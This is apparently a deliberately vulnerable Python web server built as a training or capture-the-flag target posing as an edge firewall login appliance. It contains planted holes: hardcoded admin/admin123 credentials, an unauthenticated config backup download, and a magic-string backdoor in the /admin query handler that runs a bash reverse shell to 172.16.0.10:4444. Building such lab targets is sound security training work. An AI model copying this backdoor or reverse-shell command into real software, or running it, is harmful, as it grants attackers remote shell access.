#!/usr/bin/env python3
"""
This is an AI-generated web application running on the edge firewall. The intended attack vector 
is a buffer overflow attack, however as this script was written in python a buffer overflow is not possible.
Instead, a buffer overflow is simulated - if a login attempt includes a long string of characters with a 
"command" - "bypassreturnstatement" - a reverse shell is sent to the attacker, who gains initial access.
"""
import http.server
import socketserver
import urllib.parse

PORT = 8080
VALID_USER = "admin"
VALID_PASS = "admin123"

BACKUP_CONFIG = open("/www/backup/config.bak", "r", encoding="utf-8").read()


LOGIN_PAGE = open("/www/login.html", "r", encoding="utf-8").read()

DASHBOARD_PAGE = open("/www/admin.html", "r", encoding="utf-8").read()


class Handler(http.server.BaseHTTPRequestHandler):
    def _send(self, code, body, ctype="text/html"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.end_headers()
        self.wfile.write(body if isinstance(body, bytes) else body.encode())

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)

        if parsed.path == "/backup/config.bak":
            self._send(200, BACKUP_CONFIG, "text/plain")
            return

        if parsed.path == "/admin":
            if (len(overflow := qs.get("overflow", ["0"])[0])  > 20 and "bypassreturnstatement" in overflow): #simulate buffer overflow plus injected command at the return statement
                self._send(200, DASHBOARD_PAGE)
                import subprocess
                subprocess.run('nohup bash -i >& /dev/tcp/172.16.0.10/4444 0>&1', shell=True, executable='/bin/bash') #hardcoded to represent buffer overflow as python is naturally secure against buffer overflow
                return
            self._send(200, LOGIN_PAGE)
            return

        self._send(200, "<html><body><h1>Appliance OK</h1></body></html>")

    def do_POST(self):
        if self.path == "/admin":
            length = int(self.headers.get("Content-Length", 0))
            data = urllib.parse.parse_qs(self.rfile.read(length).decode())
            user = data.get("user", [""])[0]
            pwd = data.get("pass", [""])[0]
            if user == VALID_USER and pwd == VALID_PASS:
                self._send(200, DASHBOARD_PAGE)
            else:
                self._send(401, "<html><body>Login failed</body></html>")
            return
        self._send(404, "Not found")

    def log_message(self, fmt, *args):
        print("[edge-fw]", fmt % args)


if __name__ == "__main__":
    with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
        print(f"[edge-fw] listening on :{PORT}")
        httpd.serve_forever()
